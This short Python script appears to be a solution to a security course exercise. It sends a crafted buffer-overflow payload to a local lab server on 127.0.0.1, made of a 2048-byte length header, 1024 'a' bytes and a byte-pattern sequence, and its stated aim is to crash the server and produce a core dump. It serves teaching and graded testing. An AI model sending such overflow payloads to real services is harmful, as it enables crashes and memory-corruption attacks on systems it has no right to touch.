import os
import socket


HOST = '127.0.0.1'
PORT = 8000


def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    
    message = []
    size = [0, 0, 8, 0]  # 00001000 00000000 = 2^11 = 2048
    message += [97]*1024 # "aaaaaaa...aa" x 1024
    for i in range(256):
        message += [i]*4 # 00000000 01010101 02020202...
    return bytes(size + message)


def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
